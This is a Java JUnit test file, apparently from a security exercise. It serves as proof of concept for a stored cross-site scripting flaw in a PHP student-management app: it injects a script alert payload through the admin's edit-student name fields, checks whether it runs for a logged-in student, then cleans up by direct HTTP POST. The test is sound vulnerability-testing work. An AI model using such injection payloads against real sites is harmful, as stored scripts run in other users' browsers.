package tests.suite;

import com.gargoylesoftware.htmlunit.ScriptException;
import net.sourceforge.jwebunit.junit.WebTester;
import okhttp3.*;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import tests.utilities.Helper;

import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

/**
 * Proof of concept for the XSS vulnerability #24.
 * This is a stored XSS vulnerability, exploiting the absence of
 * any sanitisation on the insert of a new student.
 * <p>
 * <h1>$studentid[1] $studentid[2]'s Classes</h1>
 *
 * @author Davide Pedranz
 */
public final class Vulnerability24 {

    private WebTester tester;
    private Helper helper;
    private OkHttpClient client;

    @Before
    public void prepare() {
        tester = new WebTester();
        tester.setBaseUrl(Helper.BASE_URL);
        helper = new Helper(tester);
        client = new OkHttpClient();
    }

    @Test
    public void test() {

        // login
        helper.loginAsAdmin();

        // edit the student (vulnerable form)
        tester.clickLinkWithText("Students");
        tester.assertMatch("Manage Students");
        tester.setWorkingForm("students");
        tester.checkCheckbox("delete[]");
        tester.clickButtonWithText("Edit");
        tester.setWorkingForm("editstudent");
        tester.setTextField("fname", "<script>alert(\""); // xss string
        tester.setTextField("lname", "xs\");</script>");  // xss string [cont]
        try {
            tester.clickButtonWithText("Edit Student");
        } catch (RuntimeException e) {
            // workaround: the attack creates invalid HTML on this page
            assertTrue(e.getCause() instanceof ScriptException);
            assertTrue(e.getMessage().contains("unterminated string literal"));
        }

        // now login as student... should find the script!
        helper.loginAsStudent();

        // NB: here we have one space more, but still the code was executed
        tester.assertNoMatch("<script>alert(\" xs\")</script>");
    }

    @After
    public void cleanup() throws IOException {

        // login
        helper.loginAsAdmin();

        // extract the session
        final String session = helper.getSessionCookie();

        // do the cleanup request
        // NB: this is done with a direct HTTP call because the attack breaks the HTML syntax
        // and JWebUnit gets crazy for that (basically there is not way to access the hidden field to edit)
        final RequestBody formBody = new FormBody.Builder()
                .add("fname", "name")
                .add("mi", "s")
                .add("lname", "surname")
                .add("username", "3")
                .add("editstudent", "1")
                .add("studentid", "1")
                .add("page", "1")
                .add("page2", "2")
                .add("logout", "")
                .build();
        final Request request = new Request.Builder()
                .url(Helper.BASE_URL + "index.php")
                .header("Cookie", session)
                .post(formBody)
                .build();
        final Response response = client.newCall(request).execute();
        assertEquals(200, response.code());
    }
}
